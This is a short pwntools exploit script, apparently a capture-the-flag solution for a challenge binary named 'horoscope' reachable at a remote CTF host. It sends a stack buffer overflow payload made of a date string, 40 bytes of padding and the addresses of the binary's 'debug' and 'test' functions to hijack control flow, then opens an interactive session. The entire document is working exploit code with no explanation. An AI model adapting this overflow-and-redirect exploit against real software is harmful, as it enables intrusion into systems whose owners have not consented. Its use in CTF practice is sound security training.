#!/usr/bin/env python3

from pwn import *
exe = ELF('./horoscope')

context.binary = exe
context.log_level='debug'

offset = 40

def conn():
    if args.REMOTE:
        io = remote('horoscope.sdc.tf', 1337)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

io = conn()

payload = flat(
    [
        b'05/07/2022/19:47',
        b'A'*offset,
        exe.sym.debug,
        exe.sym.test
        ]
    )

io.sendline(payload)

io.interactive()
